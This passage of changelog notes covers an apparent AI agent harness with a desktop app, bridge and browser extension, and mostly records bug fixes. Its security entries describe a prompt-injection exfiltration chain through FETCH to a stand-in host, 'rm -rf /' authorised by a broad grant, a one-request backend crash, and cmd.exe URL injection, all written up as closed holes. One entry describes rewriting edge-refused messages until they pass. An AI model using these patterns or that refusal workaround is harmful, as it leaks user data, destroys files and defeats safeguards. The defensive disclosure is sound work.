  the app's console, so a console-wide Ctrl+C ended it with
  STATUS_CONTROL_C_EXIT, and the supervisor read that as the content tree
  breaking the backend — three of those in a row rolled back a perfectly good
  tree, and the rollback is what kept the crash loop going. The backend is
  spawned detached now (its own console, control events cannot reach it), the
  code is still read apart from a crash for builds that predate the fix, and a
  death with no exit code at all — a signal on unix: the OOM killer, a closed
  terminal, a person's kill — is not blamed on the tree either.
- **A quiet stream asks before the run is written off.** The window used to
  cancel a run upstream after twenty silent seconds, so a laptop that slept or
  a stream that was reconnecting threw away work that was going to finish. The
  window now asks the backend whether the run is still going: an answer means
  it waits, a refusal writes the run off at once, and a backend that hangs
  gets three bounded probes before the same. The question itself cannot pile
  up — one probe at a time, four seconds each — so a hung backend cannot stall
  every other call the window makes behind the browser's connection cap.
- **A stream nobody reads is put down.** A laptop that slept or a proxy that
  reset the connection could leave a half-open SSE subscriber behind: the
  bridge believed an extension was attached and dispatched jobs into a socket
  nobody reads, and the harness kept a window in its fan-out for ever. The
  ping is now also the probe, TCP keepalive notices the peer that left without
  a FIN, and one idempotent cleanup runs on whichever signal comes first.
- **The extension opens the chat tab it needs.** A job that arrived while no
  de.aipass.net tab was open was refused with "no de.aipass.net tab is open" —
  a 502 the person could only fix by opening a tab themselves. The extension
  opens the tab, waits for it to load, and reuses it: two jobs that arrive
  together share one new tab, a tab that is already open is not duplicated,
  and a tab that cannot be opened is reported with Chrome's reason.
- **A build that finished can publish what it built.** The bundle search asked
  cargo from the repository root, where there is no `Cargo.toml`, and fell
  back to a root `target/` the bundler never writes; every platform built a
  real installer and then reported "no bundles under target" and exited 1.
  The search now asks cargo in `desktop/src-tauri`, where the Tauri crate and
  its target live, and the fallback points there too.
- **A staged content tree found through a link is still loadable.** The
  promotion probe decided whether it was the main script by comparing lexical
  paths. macOS reaches its temp directory as `/private/var` while the caller
  spells it `/var` (Windows short names have the same split), so the probe
  stayed silent, exited 0, and every update was refused as "the staged content
  did not load". The comparison is on the real path now.
- **A worktree is ours under either spelling of its folder.** Git reports the
  path it stored, which can be `/private/var` for macOS's `/var` or the long
  form of a Windows short name; the lexical ownership test did not recognise
  it, so the list showed no worktrees of ours, remove could not find one, and
  the sweep removed nothing. Ownership and containment now answer on the
  physical path as well.
- **Two checkpoints in one millisecond keep their order.** The name carried a
  timestamp and `createdAt` was taken again after the files were copied, so a
  tie in the name could disagree with the answer `list()` sorted by; the name
  and `createdAt` now come from one stamp.
- **The shell test lane can start on a clean checkout.** `tauri-build` asks
  for the Node sidecar while it compiles, not only when the app is bundled,
  and a clean checkout has none — the ~90 MB executable is gitignored. The
  rust job now puts the sidecar in place before `cargo test`, and a workflow
  test keeps that order from regressing.
- **A session archived before the folder hash is still a session.** The
  archive lives inside the project folder, and that folder's name changed;
  the archive list, the way back and the prune read only the new folder, so
  sessions an older build had archived looked deleted while their bytes were
  intact. All three now read the current and the pre-hash archive, and a
  restored session lands in the current folder.
- **The review pass on the window's work surfaces.** A live run whose
  transcript trimmed for the first time kept its cursor one row early, so the
  fold swallowed the trim marker and the row before the run; the marker now
  moves the cursor with the rows (`desktop/ui/transcript.js`,
  `test/transcript-bound.test.mjs`). The archive bar's buttons were invisible
  because `#sessions li > button` outranked the bar's own rule
  (`desktop/ui/styles.css`). A schedule list that could not be read said "no
  tasks" in both the sheet and `/schedule`; it now names the failure. The new
  git, media, schedule and export controls carry accessible names, and a
  worktree cannot be switched or removed under a live run.
- **A failed edit no longer lets a commit ride behind it.** After an edit fails
  in a reply, the chain guard skipped another edit or a RUN, but it let `GIT`,
  `VERIFY` and plugin markers keep running — so a commit could record a tree
  the reply had already broken, and a check could pass against it. The guard
  now asks the same classifier the permission gate asks: only reads and
  fetches survive a failure, and the GIT tool's own commit meets the same
  red-test gate as a RUN that spells `git commit`.
- **Git's subcommand grammar has one owner, and an unknown subcommand is a
  write.** The permission engine, the commit gate and the GIT tool each
  parsed global options their own way; `-C`, `-c`, `--git-dir` and
  `--work-tree` could hide the subcommand from one reader and not another.
  All three read `harness/git.mjs` now. The old write blocklist is an explicit
  read allowlist: `update-ref`, `filter-branch`, `worktree` and `config` are
  writes, not reads, and the branch/tag/remote/stash forms that only list are
  still reads. The GIT tool refuses a write with the subcommand it saw.
- **The bootstrap snapshot keeps git's status column, and a bad spill limit
  is not a deletion order.** `git status --short` prints a leading space for
  an unstaged change; trimming both ends of the snapshot removed it, so the
  model could not tell ` M file` from `?? file`. The snapshot trims only the
  end now. Separately, `AIPASS_SPILL_KEEP` went through `Number()` unguarded:
  an empty value became `0` and cleared every spill, and `NaN` silently kept
  them all. Only a finite positive number is a cap now, and anything else
  uses the documented default. Spill files are written with `fs.promises`,
  and the sweep runs in the background instead of blocking the result the
  model is waiting for.
- **The bridge's extension channel has a token.** Any local process that
  learned a job id could post as the extension. The bridge now mints a
  random token per run, hands it to the extension in the `ready` frame, and
  refuses every `/ext/*` post that does not carry it — so the extension and
  everything else on the machine are told apart. The token changes with
  every bridge run, so nothing about it is worth carrying around, and the
  loopback bearer gate still comes first.
- **A chat that lands in the extension's reconnect gap waits for it.** The
  MV3 service worker cycles its SSE stream every few minutes, and in that
  ~3 s gap there is briefly nobody attached — a chat that landed there
  failed outright. A job now waits a grace window (5 s,
  `AIPASS_DISPATCH_GRACE_MS`) for the extension to come back. The cache
  refreshes do not wait: nobody is blocked on them, so they fail at once.
- **A timeout tells the extension to stop.** A video job that outlived its
  timeout used to keep polling in the page and keep spending the account's
  quota. A job that fails now sends the same `abort` an abort sends. A
  reconnecting extension also adopts the job its predecessor left behind,
  so a later abort still reaches it.
- **The bridge's attachment path is bounded on both sides of the wire.** The
  SSRF guard resolves the name and checks EVERY answer it gets — a name
  that answers with one private address among public ones is refused — and
  a `data:` URI or a hostile `content-length` is refused before a byte is
  buffered. A `null` JSON body is a 400 (it is a client mistake, not a
  server fault) and a body over the limit is a 413 (the old reader
  destroyed the socket, so the client saw ECONNRESET and never learned
  why). An image model now rides the media timeout like a video does: the
  idle clock was killing renders that had already spent the credits.
- **The MCP manager's close() takes its tools with it.** The tool table
  outlived the clients, so a project switch told the model about the same
  MCP markers twice — once for the tools that are there and once for the
  servers that are gone — and the table grew for the life of the backend.
- **A window that stops reading cannot grow the backend without bound.** The
  event fan-out kept every frame for every subscriber, so a window that
  stopped reading (a laptop lid, a machine asleep) made the backend's
  memory grow for as long as it stayed away. Each subscriber now has a
  bounded queue — by frames and by bytes — and when it overflows the OLDEST
  frames go: the newest ones are the ones the window can still use. The
  losses are counted, and the subscriber is told it fell behind
  (`fell_behind`, with the number). The window does not show that notice
  yet, so the gap is still silent on screen.
- **A provider that never answers cannot hang a run.** The catalog deadline
  is now a timer the process holds (Node's own timeout signal does not keep
  the loop alive, so a CLI whose only pending work was the catalog fetch
  ended with an unsettled promise instead of a message naming the silent
  provider), it is cleared when the fetch answers, and it can be given
  more room per provider (`modelsTimeoutMs`) or once for the machine
  (`AIPASS_PROVIDER_MODELS_TIMEOUT_MS`, default 10 s). The answer names the
  provider that stayed silent.
- **A staged write into a linked heavy directory cannot land in the real
  project.** The projection SHARES `node_modules`, `dist` and the rest with
  the real tree instead of copying them, so a write staged into one of them
  would land in the person's project rather than in the run's copy. It does
  not: a staged path inside a shared directory is left out of the
  projection — every segment of the path is checked, so a nested
  `packages/app/node_modules` is caught too — and the file in the real
  project keeps its bytes. The refusal itself is the house shape (`err:`,
  naming the directory) and it is exported (`sharedWriteRefusal`); the model
  is told at the moment it stages the change, and an apply refuses it again
  at the last gate before the disk — for a change staged before the rule
  existed — and names the folder either way.
- **The window's transcript no longer grows without bound.** Every row the
  window ever painted stayed in the DOM, so a long run made the page heavy
  and the scroll slow. The oldest rows go after 300 and a line says how
  many went — a window that silently drops what it showed is a window that
  lies about what it did. The rows are the VIEW; the record is the session
  file on disk, and it still holds everything.
- **`/help` reads the palette.** The command list in the help was written
  out by hand, and it had gone stale — the window had commands the help
  never mentioned, and a command that exists but is not in the help is a
  command nobody finds. The help now lists the palette itself, so the two
  cannot disagree.
- **A session of another project is not reachable by its path.** The window
  lists sessions with their path, and a path names a session at least as
  precisely as an id does — but the guard that refused another project's
  session only recognised the *id* spelling, so a path went straight past it.
  `session.open`, `session.rename` and `session.delete` accepted a path to
  another project's session: it opened, it was renamed, and it was deleted.
  The path is held to the same rule as the id now, and the refusal names the
  project it belongs to (`aipass-bridge/harness/session.mjs`,
  `aipass-bridge/harness/rpc/session.mjs`).
- **Two projects whose paths slugify the same no longer share a picker.** The
  directory a session lives in is named after the path, and the name is
  lossy: `C:\a b` and `C:\a-b` are the same slug, and a long path is cut at
  60 characters. The two projects therefore shared one directory, and the
  picker showed each of them the other's conversations. The header's own
  `root` is the authority on which project a session belongs to now — so the
  picker, the handle and the relocation all ask the file rather than the
  folder it sits in.
- **A relocation no longer carries another project's sessions with it.** The
  same slug collision, one step further: moving a project re-keyed every
  session in its directory, including a neighbour's, and the neighbour's
  history was re-stamped to the wrong project.
- **Two writers on one session no longer lose each other's changes.** The
  desktop backend and the CLI share one store, and a window can be open on a
  project while a command line runs in it. The header rewrite was a
  read-modify-write with no lock, so the second writer put back a copy of
  the header that was older than the file's: a rename was undone, and the
  conversation binding — the thing that keeps one session's messages out of
  another session's history — was rolled back. The rewrite takes a lock and
  merges against the header on disk now, so a rename in one writer survives
  an append in the other.
- **A session id is no longer a birthday collision waiting to happen.** It
  was eight hex digits of `Math.random()` — 32 bits, and a session id is a
  FILE NAME, so a collision was not a key that got refused: the new session
  replaced the old one and the whole conversation was gone without a word.
  48 bits from the crypto module, and a collision can no longer destroy
  anything.
- **A long session no longer takes the window down with it.** A session file
  was read whole and split into an array of lines — twice the file, in a
  desktop app that also holds a browser. It is walked in chunks now, and
  past 64 MB (`AIPASS_MAX_SESSION_BYTES`) the session is refused with a
  reason rather than loaded.
- **A command is screened in the transcript the way its output is.** The
  output of a command was scrubbed of credentials before it entered the
  session; the command line itself was not, so a credential written into a
  command (`curl -H "Authorization: Bearer …"`) sat in the transcript on disk
  in the clear, and was sent back to the model on the next resume. The
  permission prompt still shows the real command — a person consents to what
  they can read.
- **A finished conversation is on the disk.** The entries of a session were
  appended but never flushed: the header rewrite did not fsync the file, and
  nothing flushed it at the end of a run either. A power cut could take the
  end of a conversation — and the header that said how many entries it had —
  with it. The rewrite now puts the entries and the header on the disk
  together, and a run that has ended flushes its session once more.
- **The picker does not read 64 KB to get 2 KB.** Every session's header was
  read with a 64 KB buffer, and the store has hundreds of sessions. The read
  is sized to the header now, and the headers the store has read are memoized
  on the file's mtime+size — the same pair the overlay memoizes its texts on.
  The picker over 500 sessions went from a quarter of a second to a fortieth
  of one, and a renamed session is still shown under its new name.
- **A window file that is gone is a 404, and the backend lives through it.**
  The window's files are served from disk while the backend runs, and the
  content update replaces that tree under it — so the file can vanish between
  the check and the read. The read threw inside the request handler, and a
  throw there is an unhandled rejection: the backend ended, for every window
  that was open. A file that is not there is a 404 now, and the read has an
  error handler of its own. A name that needs percent-encoding is served too.
  (`aipass-bridge/harness/rpc.mjs`)
- **The window's stream is bounded, and a slow window loses nothing.** A window
  that stopped reading grew the backend's memory with the transcript it never
  read: the frames were queued in this process, with nothing to notice. The
  fan-out that was written for exactly this (`harness/events.mjs`, with its
  bounded queue and its "fell behind" notice) was never wired in — it is now.
  The replay buffer counts BYTES, not UTF-16 code units, so the "4 MB" budget
  is four megabytes and not twelve of Thai text. And a frame the sink took
  while it was behind is no longer written a second time on the next flush.
  (`aipass-bridge/harness/rpc.mjs`, `aipass-bridge/harness/events.mjs`)
- **The window hears the end of a run once.** The attempts are one run from the
  window's point of view, and the "finished" frame arrived after EVERY one of
  them: the window took its working bar down and cleared the staged
  attachments while the next attempt was still streaming into it. The frame is
  held now, and published once, after the last attempt.
  (`aipass-bridge/harness/rpc.mjs`, `aipass-bridge/harness/rpc/session.mjs`)
- **A stop that lands between two attempts is not lost.** The abort controller
  belongs to the run in flight, so a stop pressed while the checker was running
  had no controller to abort — the retry installed a fresh one and carried on
  with the work the person had told it to stop. The request is remembered until
  the next run answers it. (`aipass-bridge/harness/harness.mjs`)
- **A settings save writes only the keys the file knows.** Every key the caller
  sent was persisted, so a form that typed `modde` instead of `mode` left the
  typo in `settings.json` for ever, where it read like a setting nobody could
  change and the sheet never showed it. (`aipass-bridge/harness/rpc/settings.mjs`)
- **An added provider keeps its own model.** The model the caller pinned
  belongs to the AiPASS catalog, and another provider was handed it: the run
  failed with a model that provider had never heard of. The explicit model is
  the AiPASS provider's; every other provider keeps its own.
  (`aipass-bridge/harness/rpc.mjs`)
- **The MCP markers are not duplicated when the project changes.** The tool
  table outlived the clients it belonged to, so every project switch pushed the
  same tools in again: the preamble listed each MCP tool once per switch, and a
  tool whose server was gone was still offered to the model.
  (`aipass-bridge/harness/mcp.mjs`)
- **A home that cannot be written does not take the backend down.** The
  loopback token is minted inside a request handler, and the write was outside
  any try: a read-only home threw there, and a throw there is an unhandled
  rejection, which ends this process for every window that is open. The token
  is written best effort now, and a home that cannot hold it keeps it in
  memory — the same one on every call.
  (`aipass-bridge/harness/authtoken.mjs`)
- **An attachment rides the message it was sent with.** The parts belong to
  the first message of the RUN; the gate was the session's own first run,
  which is a different thing. From the second run of a session onward the
  picture was read, encoded and then dropped: the model was asked about a file
  it had never seen, and the window reported the send as a success.
  (`aipass-bridge/harness/run/context.mjs`)
- **A save no longer undoes the change another surface made.** The settings
  file is shared by the window, the CLI and the backend, and two of them can
  write it. A save merged into the copy the process happened to be holding and
  wrote every other key back unchanged, so a project that had been moved landed
  back under its old path, with no trace of who undid it. The file is read
  again before the merge, and a harness picks a side-door change up instead of
  running yesterday's temperature. (`aipass-bridge/harness/settings.mjs`,
  `aipass-bridge/harness/rpc.mjs`)
- **A session of another project is not opened, renamed or deleted.** The
  lookup fell back to every project's directory, so an id learned from another
  window reached that window's sessions: one project's Apply could write
  another's transcript. The fallback now holds only for a project whose folder
  is gone — the one case where the session is still this person's work — and a
  refusal names the project it belongs to.
  (`aipass-bridge/harness/session.mjs`, `aipass-bridge/harness/rpc/session.mjs`)
- **The QA pass says which step hung.** A step that never finished — a test
  file that never exits — was waited on in silence until the suite's own
  ten-minute ceiling, and the pass said nothing for ten minutes. Each step has
  a ceiling now, and a killed step is a failed step that names itself. The live
  check carries the loopback token as well, so a backend that refuses it is
  reported as refusing it instead of as a green line with no model on it.
  (`scripts/qa-loop.mjs`)
- **The window can search its own project again.** The file index skipped the
  secret files with a rule it had never imported, so every name search and
  every content search in the file panel answered "cannot read" — the panel's
  own tests stub the search, so a broken index looked like an empty result
  instead of a failure. The rule now comes from the one place that owns it
  (`aipass-bridge/harness/rpc.mjs`), and a test asks the backend for real.
- **A provider switch rebuilds the model list, even when a refresh is in
  flight.** The list belongs to the provider, so a switch rebuilds it from
  scratch. But a refresh already in flight was fetching the OLD provider's
  list, and the switch joined it instead of asking again: the dropdown kept
  offering the previous provider's model, and the refresh button did nothing
  at all. The callers that need a different list are queued behind the one in
  flight (`desktop/ui/app.js`).
- **A stop that found nothing takes the working bar down with it.** The bar
  kept beating "กำลังหยุด…" for the rest of the session when the backend said
  there was no run to stop, so the window said it was working while nothing
  was (`desktop/ui/app.js`).
- **The MCP family answers for the project the call is about.** The servers,
  the tools and the enable/disable switch read the backend's CURRENT project,
  so two windows on two projects read each other's MCP servers, and the
  sheet's switch wrote the other project's config
  (`aipass-bridge/harness/rpc.mjs`, `aipass-bridge/harness/rpc/plugins.mjs`).
- **The window hears what the run is waiting for.** The bridge's notes — a
  rate-limit wait, the pace between sends — were bound to an emitter that was
  not there, so a run waiting out a 429 looked exactly like a stuck one
  (`aipass-bridge/harness/rpc.mjs`).
- **Enter in the file filter opens the line the search found.** A content
  search answered "notes.md:42" and the row opened there; Enter opened the top
  of the file instead (`desktop/ui/panels/files.js`).
- **The update answer says what was scheduled.** A caller that asked for no
  restart was told a restart happened, and one that waits for the backend to
  come back waited for a restart that was never set
  (`aipass-bridge/harness/rpc/update.mjs`).
- **The update check is on the clock its own comment promised.** The window
  asked once at startup; the comment said once at startup and then every six
  hours, so a window left open for days never heard about a new content
  release (`desktop/ui/app.js`).
- **Two requests in the same millisecond no longer share one key.** The
  bridge's in-flight set was keyed by the start time, so the first of two
  requests to close deleted the entry while the other was still running — the
  bridge could look idle with a request in flight
  (`aipass-bridge/bridge/server.mjs`).
- **An edited provider is live at once.** A provider's client is not rebuilt
  when the provider did not change — a provider client owns the conversation
  history, and a settings save must not drop it — but an EDITED provider (a
  new endpoint, a new model list) was keeping the client that answers for the
  old spec, so the window kept asking the endpoint the person just changed.
  The client is rebuilt when the spec changed, and only then.
- **The shell says "I could not say" instead of guessing.** A probe that
  could not run was reported as "nothing is listening", the opposite of what
  the probe's own contract says (`desktop/src-tauri/src/main.rs`).
- **An attached image is an icon, not a broken picture.** The backend holds
  the bytes and does not hand them back, so the thumbnail was an empty data
  URL (`desktop/ui/app.js`).
- **A method nobody has is a 404.** The lookup found the inherited
  `Object.prototype` members too, so a call for `toString` answered 200 with
  "[object Undefined]" instead of the 404 that says "there is no such method
  here" (`aipass-bridge/harness/rpc.mjs`).
- **A provider spec keeps the fields the provider client reads.** The spec is
  sanitized on the way in, and the sanitizer dropped `apiKeyHeader`,
  `apiKeyPrefix`, `maxTokens` and `anthropicVersion` — so a provider that
  wanted its key under another header, without the `Bearer ` prefix, or with
  its own token ceiling, was saved without them and the client fell back to
  its defaults. They survive now, and a header name that is not a token (a
  newline in it is a header injection) is refused
  (`aipass-bridge/harness/providers.mjs`).
- **The window names its controls, and the transcript stops reading itself
  twice.** The icon buttons in the header and the rail carried only a `title` —
  a tooltip, which a screen reader does not read when the control takes focus —
  so half of them were unnamed, and the header's and the composer's selects
  were nameless too; the theme button also never said which theme was on.
  Every icon button and every select now carries an `aria-label`, the theme
  button names the theme that is on now, the two ☰ controls are real buttons
  that say whether the rail is open, and the transcript holds its
  announcements with `aria-busy` while a run streams — the answer is painted
  frame by frame, so a live region that announced every frame read the same
  half-written sentence again and again. The pending panel's count reads in
  Thai like the rest of the window, the theme button keeps the icons the
  markup draws, and `md.js` is no longer loaded twice (`desktop/ui/index.html`,
  `desktop/ui/app.js`, `desktop/ui/styles.css`).
- **The desktop stops restarting a backend it can never start.** A busy port
  was a crash like any other, so the shell's supervisor answered it with a
  fresh backend — which bound the same port, failed the same way, and was
  answered with another fresh backend. The log filled with
  "backend exited — restart attempt 1" and the window sat on a port nothing
  was answering. A busy port is now a fact about the machine with its own
  exit code, and the supervisor asks who is holding it: one of our backends
  (adopt it — the window already points there) or a stranger (say so, with
  the fix, and back off). The shell asks the port the same question the
  launcher asks, through the same probe module, so the two cannot drift
  (`aipass-bridge/harness/rpc.mjs`,
  `aipass-bridge/harness/backend-probe.mjs`, `desktop/src-tauri/src/main.rs`).
- **The window no longer adopts a stranger's server.** The shell decided
  "a backend is already there" from a bare TCP connect, so anything on the
  port — a program that has never heard of aipass — was adopted, and the
  window opened against it. The shell asks the same question the launcher
  asks now, and only our own backend counts as ours.
- **The bridge no longer piles up.** The bridge is started detached, so it
  outlives whatever started it, and nothing could end it: the pid file was
  written by the starter, so it named a process that had often died, and the
  next bridge overwrote it. One machine had seventy of them alive, holding
  3.4 GB, and every app on it was slower for it. The bridge now records its
  own pid when it binds — the one that is really answering — and it ends
  itself once nobody has used it for ten minutes. The window keeps it alive
  by asking for the credits every ten seconds, and the extension by holding
  its event stream open on a four-minute cycle; a bridge nobody is talking
  to goes away, and `aipass stop` still ends one at once.
- **The test suite stops leaving a bridge behind.** The suite starts the
  bridge detached, on a port of its own, and the bridge outlived the run. The
  suite now ends it at the end, the way it already ended the browser
  (`scripts/test.mjs`, `scripts/suite-env.mjs`,
  `aipass-bridge/harness/bridge-pid.mjs`).
- **A refused message is no longer probed at the edge.** The chain that can
  actually fix a refusal — drop the risky lines, shorten it, halve it — lives
  in the client, and the tab could not see it: so the tab re-sent the
  identical bytes and waited 15 s, then 60 s, before the client was even told
  the message had been refused. The run sat in "[403] refused at the edge" for
  a minute and a quarter while the one request that carried on was available
  all along (recorded live, Oct 21 2026: a 3,721-byte message refused, the
  same message at 2,242 bytes accepted). The client now says on every send
  that it rewrites a refusal, and the tab hands the refusal back at once
  instead of probing — the client fixes the message on the next request, and
  the run carries on. A client that does not say so keeps the tab's own
  ladder, since it has no rewrite to offer
  (`aipass-bridge/extension/page.js`, `aipass-bridge/bridge/server.mjs`,
  `aipass-bridge/harness/bridge.mjs`, `aipass-bridge/test/page.test.mjs`,
  `aipass-bridge/test/run-resilience.test.mjs`).
- **The step's headline is not said twice.** The window showed the model's
  first line under the step as well as in the bubble, so every step of a run
  read the same sentence two times. The bubble holds the prose; the headline
  is only worth a line when the bubble does not carry the same words
  (`desktop/ui/app.js`, `aipass-bridge/test/ui.test.mjs`).

- **The desktop port is read the way the shell reads it.** `AIPASS_DESKTOP_PORT`
  was parsed with `Number`, which reads `0x50` as 80 and `1e3` as 1000 — so
  the backend and the shell could be handed two different ports by one
  environment variable, and the window opened a port nothing was listening on.
  The value is decimal digits now, and anything else is refused on both sides
  (`aipass-bridge/harness/launcher.mjs`,
  `aipass-bridge/test/launcher.test.mjs`).
- **The desktop app starts one bridge, not two.** The backend started a
  bridge of its own in the background while the launcher started one too: the
  two raced for the same port, and the loser's fifteen-second retry kept the
  app's process alive after the window was already up. The launcher owns the
  bridge — it is the one that says so in the banner — so the backend waits for
  it instead of starting one
  (`aipass-bridge/harness/launcher.mjs`).
- **A busy port is named before anything else happens.** The launcher probed
  the port, then bound it: a server that took the port in between died with a
  raw `EADDRINUSE` stack. The launcher waits for the bind now, and says which
  port is busy and what to do about it
  (`aipass-bridge/harness/launcher.mjs`).

- **A run in the desktop app is no longer refused by its own bridge.** The
  bridge gates every route but its health probes, and the harness's own bridge
  client — the one a window's runs speak through — was not presenting the
  token it minted. Every run was refused with a 401, and the window turned
  that refusal into "the extension's token is wrong", which sent the reader to
  paste a token into the extension's popup: a fix for a problem the extension
  never had. The client presents the token now, and to a loopback bridge and
  to nothing else, so a remote bridge never sees it
  (`aipass-bridge/harness/bridge.mjs`, `aipass-bridge/harness/authtoken.mjs`,
  `aipass-bridge/test/auth.test.mjs`).
- **The window does the half of the extension's token that it can.** The
  extension talks to the bridge, not to the window, and a refusal there
  arrives as "extensions: 0" — the same number a missing extension gives. The
  bridge now reports which of the two it is (`/status` carries
  `extensionToken`), and the window repeats it: the reader is no longer sent
  to load an extension that is already loaded, and one click puts the token
  the window already holds on the clipboard, so the step that only the popup
  can do is a paste. A token refusal on the window's own side no longer
  points at the extension at all (`aipass-bridge/bridge/server.mjs`,
  `aipass-bridge/harness/rpc.mjs`, `desktop/ui/app.js`,
  `aipass-bridge/test/ui.test.mjs`).
- **The build lane finds the bundler.** The bundler is the Tauri CLI, and this
  repository installs no npm packages (the zero-dependency rule), so nothing
  put `tauri` on PATH and the lane died on every platform with "spawnSync
  tauri ENOENT". The lane installs the CLI from cargo now, and the script
  calls it under whichever name the machine has: the npm shim (`tauri`) or the
  cargo one (`cargo tauri` — the `tauri-cli` crate installs `cargo-tauri`,
  *not* `tauri`). `AIPASS_TAURI_CLI` still names the binary
  (`scripts/build-desktop.mjs`, `docs/INSTALL.md`).
- **Two projects no longer share one session folder.** A project's sessions
  live in a folder named after its path, and the name was the path with
  everything but letters and digits turned into dashes, cut at 60 characters.
  macOS puts a temporary directory at `/var/folders/<xx>/<hash>/T/<name>`,
  which is longer than 60 characters once it is spelled out, so the
  distinguishing tail was cut off and TWO projects under one temporary
  directory shared ONE folder: one project's conversations showed up in
  another project's picker, and a relocation left the other's files behind.
  The name carries a hash of the whole path now — unique however long the path
  is — and the folder an older build named is still read by the picker and
  still moved out of by a relocation, so no session is left behind
  (`aipass-bridge/harness/session.mjs`).
- **The symbol index is written again.** The indexer called the writer
  without the index, so `JSON.stringify(undefined)` was `undefined`, the write
  threw, and the throw was swallowed: the index never reached the disk and
  every run re-read the whole project
  (`aipass-bridge/harness/symbols.mjs`).
- **A read no longer re-pins the memory store's folder.** The store set its
  folder to owner-only on every call, a read included, and the chmod undid any
  lock the owner had put on that folder — so a folder made read-only took the
  write anyway. The mode is set when the store creates the folder and left
  alone afterwards (`aipass-bridge/harness/memory-store.mjs`).
- **The desktop app starts in dev.** `npm run tauri:dev` died before the
  window: Tauri runs the `beforeDevCommand` in the directory it was started
  in — the repo root — and the command named `node main.mjs`, which is the
  launcher one folder down. The dev command now goes through the package
  script (`npm run desktop:backend`), which runs in the package root
  wherever it was typed, and the launcher is named the way the repo root
  sees it (`desktop/src-tauri/tauri.conf.json`, `package.json`).
- **The CLI ends cleanly, on Windows.** `aipass status` printed a perfect
  report and then died: `process.exit()` right after the bridge's HTTP calls
  races Node's teardown and trips libuv's assert in `win/async.c:94`
  (0xC0000409), so the shell saw a crash code for a command that had
  answered everything. The dispatcher now ends the way `doctor.mjs` and
  `list.mjs` already did — `exitCode` and a drained loop, no `process.exit()`
  — and the sockets are closed on the way out, so the command also stops
  waiting for them (nodejs/node#56645,
  `aipass-bridge/bin/aipass.mjs`, `aipass-bridge/test/cli.test.mjs`).
- **The desktop app's CLI install actually installs a CLI.** The tray item
  **ติดตั้ง CLI (aipass)** wrote a shim into a per-user bin directory that
  was not on PATH, so the command it installed could not be typed — the one
  step left was editing PATH by hand, and that never happens. The item now
  puts the directory on the **user** PATH (`HKCU\Environment`; the machine
  PATH is never touched), keeping the registry type, and says so
  (`desktop/src-tauri/src/main.rs`).
- **The bridge says why the extension is not there.** An extension without the
  loopback token retries every three seconds, every retry is a 401, and
  `/status` answers `extensions: 0` — so the only symptom was a number, and
  the cause (the token was never pasted into the popup) had to be guessed. The
  bridge now names it, once every thirty seconds: "the extension was refused:
  it has no loopback token — paste the contents of `~/.aipass/.token` into the
  extension popup (Advanced → Loopback token) and save"
  (`aipass-bridge/bridge/server.mjs`, `aipass-bridge/test/auth.test.mjs`).

- **The loopback surface holds.** A security pass over the desktop app found
  the boundary between the user's machine and everything that reaches for it
  had several one-request holes in it, and they are closed now:
  - A malformed request target took the whole desktop backend down. The URL
    was parsed as the first statement of an async listener, so the rejection
    became an unhandled rejection and the process-level handler exited the
    backend — one `GET //[` from any local process, or from any web page (a
    plain GET needs no preflight). It answers 400 now.
  - A session handle that carried a separator was a raw file path, so
    `session.delete` deleted whatever it named and `session.rename` rewrote
    its first line. A handle may only name a file inside the store.
  - The bearer token rode along to whatever host the bridge URL named: the
    clients asked "does this URL start with the bridge URL", and every call
    site built its URL as `${BRIDGE}${path}`, so the answer was yes by
    construction. The question is about the HOST now, and the token goes to
    loopback and nowhere else.
  - A URL handed to the Windows fallback (`cmd /c start`) could carry `&`,
    `|`, `^` or `%VAR%` — cmd.exe parses its own command line, so a URL with
    a query string was a command. The allowlist refuses them.
  - The suite auto-started a bridge on the developer's real port 8787, with
    the no-token escape hatch on, detached, and it outlived the run: an
    unauthenticated bridge squatting the real port, which any web page could
    blind-POST to and spend the account's credits. The suite names a port of
    its own and ends any bridge it started, and the bridge itself now refuses
    the shared default port with the token gate off — the port is the only
    thing a web page can guess.
  - The desktop port is validated on both sides. `AIPASS_DESKTOP_PORT=0` is
    "any free port" to Node and "nothing" to the Tauri shell, which opened
    `http://127.0.0.1:0/` with nothing behind it; an empty value was 8790 to
    one side and 0 to the other.
  (`aipass-bridge/harness/rpc.mjs`, `harness/session.mjs`,
  `harness/authtoken.mjs`, `harness/browser.mjs`,
  `aipass-bridge/test/harness.mjs`, `scripts/test.mjs`, `desktop/main.mjs`,
  `desktop/src-tauri/src/main.rs`, `aipass-bridge/test/loopback-surface.test.mjs`).
- **A fetch is a question, not a read.** FETCH is the one tool whose
  destination the model chooses, so `NEED file` followed by
  `FETCH https://elsewhere.example/x?t=…` was a complete exfiltration
  channel a page the agent read could talk it into — and nothing asked. It is
  a tier of its own now, no mode pre-answers it, and the window shows the URL
  it is about to send to. The CLI has no window to ask in, so `--allow-fetch`
  is the consent there, the way `--allow-run` is for the shell.
  (`aipass-bridge/harness/permissions.mjs`, `aipass-bridge/agent.mjs`).
- **`auto` asks about the shell.** The documented meaning of `auto` is
  "writes go through without asking"; the code let `auto` plus `allowRun` run
  every shell command silently. `yolo` is the mode that lets the shell
  through (`aipass-bridge/harness/permissions.mjs`).
- **A remembered "always" is not a blanket.** A RUN carries its command in its
  body and an empty argument, so every shell call shared the grant key
  `run:` — one "always" on `ls -la` authorised `rm -rf /` after it, in that
  run and in every run after it. A shell grant is keyed by the command's
  shape now: `git status` does not cover `git push`, and a grant written
  before the shape existed answers nothing
  (`aipass-bridge/harness/rules.mjs`, `harness/permissions.mjs`).
- **A repository cannot start a program on your machine.** A project-scoped
  `.aipass/mcp.json` was spawned the moment the project was opened — no
  trust prompt, no allowlist, no sandbox, with the harness's own environment
  handed to the child — and a repo-supplied file could declare itself `read`,
  the tier that never asks. A project-scoped server now runs only when the
  user has approved it by name in the home `mcp.json`, it may not declare
  itself `read`, and its child inherits only what its own config names
  (`aipass-bridge/harness/mcp.mjs`).
- **A "disabled" plugin does not run.** The enabled-list was checked after
  the dynamic import, so a disabled plugin's top-level code had already run
  — and that is where a plugin does its damage (`aipass-bridge/harness/plugins.mjs`).
- **The private-address guard is pinned to the connection.** It resolved the
  name and vetted the answer, then `fetch` resolved it again — so a name with
  TTL=0 could answer public for the check and private for the request. The
  address that was vetted is the address the socket goes to now, the verdict
  cache is short, and the classifier knows the CGNAT, protocol-assignment,
  benchmarking and reserved ranges as well as the IPv4-compatible and NAT64
  IPv6 forms (`aipass-bridge/bridge/private-hosts.mjs`,
  `bridge/server.mjs`, `harness/tools.mjs`).
- **The swap is atomic for real.** The stores wrote to a fixed
  `<file>.tmp` — one name for the whole machine — so two writers fought over
